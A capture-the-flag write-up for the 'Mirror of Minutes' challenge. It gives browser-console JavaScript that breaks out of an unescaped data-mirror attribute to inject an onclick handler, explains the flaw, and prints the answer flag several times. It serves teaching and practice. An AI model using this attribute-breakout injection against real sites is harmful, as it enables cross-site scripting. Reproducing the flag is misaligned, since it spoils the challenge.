---
layout: writeup

title: Mirror of Minutes
difficulty: Medium
points: 500
categories: [General]
tags: []

flag: cys{m1rr0r_p4ss}
---


## Mirror of Minutes

## Quick Start

### Step 1: Open Developer Console
- Press **F12** on your keyboard
- Click on the **Console** tab

### Step 2: Execute the Exploit
Copy and paste this into the console:

```javascript
// Inject XSS payload into the reflection data
reflections.push({
    timestamp: Date.now(),
    id: "exploit",
    mirror: `survivor" onclick="window.networkUtils.unlockMirror()`,
    text: "payload triggered",
    contact: "attacker@void"
});

// Re-render to inject the XSS
renderObservations();

// Click the injected element to trigger XSS
document.querySelector('[data-mirror]').click();

// Verify and get flag
verifyLucidity();

// Display flag
alert(document.getElementById('flagContent').textContent);
```

### Step 3: Get the Flag
The flag will appear: `cys{m1rr0r_p4ss}`

---

## How It Works

### The Vulnerability
The `data-mirror` attribute is **not escaped**:

```javascript
// Vulnerable code in renderObservations():
`<div data-mirror="${mirrorAttr}" ...>`
// mirrorAttr is never HTML-escaped!
```

### The Exploit Chain

1. **Inject malicious mirror value** - Break out of the data attribute with `"`
2. **Add onclick event** - `onclick="window.networkUtils.unlockMirror()"`
3. **Re-render observations** - Call `renderObservations()` to insert the XSS
4. **Trigger the event** - Click on the observation item
5. **Unlock the flag** - The XSS calls `unlockMirror()` which sets `isLucid = true`
6. **Verify and display** - Call `verifyLucidity()` to show the flag

### Why This Works

```
Injected HTML:
<div data-mirror="survivor" onclick="window.networkUtils.unlockMirror()">
    ...
</div>

When clicked → onclick fires → unlockMirror() executes → isLucid = true
```

---

## The Flag

```
cys{m1rr0r_p4ss}
```

---

## Key Concepts

| Concept | Explanation |
|---------|-------------|
| **XSS** | Injecting JavaScript code through user input |
| **Unescaped Attribute** | HTML special characters not converted to entities |
| **DOM Injection** | Modifying page elements dynamically |
| **Event Triggers** | Using click/load events to execute code |
| **Hidden Functions** | Discovering unexposed functions via inspection |

---
